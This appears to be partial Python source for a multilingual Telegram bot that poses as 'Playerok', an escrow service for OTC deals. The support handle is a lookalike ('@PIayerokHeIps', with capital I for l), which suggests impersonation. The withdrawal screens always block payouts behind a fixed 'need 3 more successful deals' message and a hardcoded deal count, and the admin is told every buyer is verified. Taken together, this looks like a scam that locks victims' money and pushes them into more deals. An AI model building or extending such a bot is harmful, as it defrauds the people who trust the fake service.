...
async def send_log_to_chat(context, message: str):
    try:
...
WELCOME_TEXTS = {
    "ru": (
        ...
        f"{E_BRIEF} Playerok - Мы специализированный сервис по обеспечению безопасности вне биржевых сделок.\n\n"
        ...
        "• Комиссия сервиса: 1%\n"
        "• Режим работы: 24/7\n"
        "• Техническая поддержка: @PIayerokHeIps\n"
        "• Наш сайт - playerok.com\n\n"
        f"{E_SHIELD} Выберите нужный раздел ниже:"
    ),
    "en": (
        f"Welcome {E_WAVE}\n\n"
        f"{E_BRIEF} Playerok - We are a specialized service for securing OTC deals.\n\n"
        ...
        "• Working hours: 24/7\n"
        "• Technical support: @PIayerokHeIps\n"
        "• Our site - playerok.com\n\n"
        f"{E_SHIELD} Choose a section below:"
    ),
    "ar": (
        f"مرحباً {E_WAVE}\n\n"
        f"{E_BRIEF} Playerok - نحن خدمة متخصصة في تأمين الصفقات خارج البورصة.\n\n"
        f"{E_SPARK} خوارزمية تنفيذ آلية.\n"
        f"{E_LIGHT} السرعة والأتمتة.\n"
        f"{E_CARD} سحب مريح وسريع للأموال.\n\n"
        "• عمولة الخدمة: 1%\n"
        "• ساعات العمل: 24/7\n"
        "• الدعم الفني: @PIayerokHeIps\n"
        "• موقعنا - playerok.com\n\n"
        f"{E_SHIELD} اختر القسم المطلوب أدناه:"
    ),
    "zh": (
        f"欢迎 {E_WAVE}\n\n"
        f"{E_BRIEF} Playerok - 我们是专业的场外交易安全服务商。\n\n"
        f"{E_SPARK} 自动化执行算法。\n"
        f"{E_LIGHT} 速度与自动化。\n"
        f"{E_CARD} 便捷快速的资金提取。\n\n"
        "• 服务佣金：1%\n"
...
E_CARD_W   = '<tg-emoji emoji-id="5902056028513505203">💳</tg-emoji>'
E_CASE_W   = '<tg-emoji emoji-id="5893255507380014983">💼</tg-emoji>'
E_FOLDER_W = '<tg-emoji emoji-id="6039630677182254664">📂</tg-emoji>'
...
async def balance_withdraw_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    texts = {
        "ru": (
            f"<b>ВЫВОД СРЕДСТВ</b>\n\n"
            f"<b>Ваши балансы:</b>\n"
            f"{E_DOLLAR_W} {context.user_data.get('balance', 0.0):.2f} RUB\n<tg-emoji emoji-id=\"5388774339623540025\">🪙</tg-emoji> {context.user_data.get('balance_TON', 0.0):.2f} TON\n⭐️ {context.user_data.get('balance_Stars', 0.0):.2f} Stars\n\n"
...
async def withdraw_method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # У пользователя 0 сделок — показываем заглушку "нужно ещё 3"
    text = (
        f'<tg-emoji emoji-id="5208485880418820053">💸</tg-emoji> '
        + {
            "ru": "<b>ДЛЯ ВЫВОДА НЕОБХОДИМО ПРОВЕСТИ ЕЩЁ 3 УСПЕШНЫХ СДЕЛОК</b>",
            "en": "<b>YOU NEED 3 MORE SUCCESSFUL DEALS TO WITHDRAW</b>",
            "ar": "<b>تحتاج إلى 3 صفقات ناجحة أخرى للسحب</b>",
            "zh": "<b>还需完成3笔成功交易才能提款</b>",
        }.get(lang, "<b>ДЛЯ ВЫВОДА НЕОБХОДИМО ПРОВЕСТИ ЕЩЁ 3 УСПЕШНЫХ СДЕЛОК</b>")
        + f"\n\n"
        f"{ {'ru': '<b>Ваши балансы:</b>', 'en': '<b>Your balances:</b>', 'ar': '<b>أرصدتك:</b>', 'zh': '<b>您的余额：</b>'}.get(lang, '<b>Ваши балансы:</b>') }\n"
        f"{E_DOLLAR_W} 0.00 ({ {'ru': 'Пусто', 'en': 'Empty', 'ar': 'فارغ', 'zh': '空'}.get(lang, 'Пусто') })\n"
        f"{E_CASE_W} { {'ru': 'Ваши успешные сделки:', 'en': 'Your successful deals:', 'ar': 'صفقاتك الناجحة:', 'zh': '您的成功交易：'}.get(lang, 'Ваши успешные сделки:') } {context.user_data.get('deals_count', 0)}\n"
        f"{E_FOLDER_W} { {'ru': 'Требуется: 3', 'en': 'Required: 3', 'ar': 'مطلوب: 3', 'zh': '需要：3'}.get(lang, 'Требуется: 3') }"
    )
...
async def confirm_pay_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # Уведомление ADMIN
    admin_notify = (
        f'<tg-emoji emoji-id="6041921818896372382">👋</tg-emoji> Пользователь {buyer_name}\n'
        f"Присоединился к сделке <b>#{ref_code}</b>\n\n"
        f'<tg-emoji emoji-id="6039630677182254664">📂</tg-emoji> Успешных сделок покупателя: {context.user_data.get("deals_count", 0)}\n'
        f'<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> Проверенный пользователь\n\n'
        f"⚠️ Проверьте соответствие пользователя\n\n"
    ...
    try:
        await context.bot.send_message(ADMIN_ID, admin_notify, parse_mode="HTML")
    except Exception:
        pass
...
async def admin_approve_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    # Покупателю — вывод от 3 сделок
    if deal.get("buyer_id"):
        buyer_text = (
            f'<tg-emoji emoji-id="5208485880418820053">💸</tg-emoji> <b>Информация о выводе средств</b>\n\n'
            f"По условиям платформы вывод средств доступен после проведения <b>3 успешных сделок</b>.\n\n"
            f"На данный момент у вас: <b>1 сделка</b>.\n"
            f"Осталось провести ещё: <b>2 сделки</b>.\n\n"
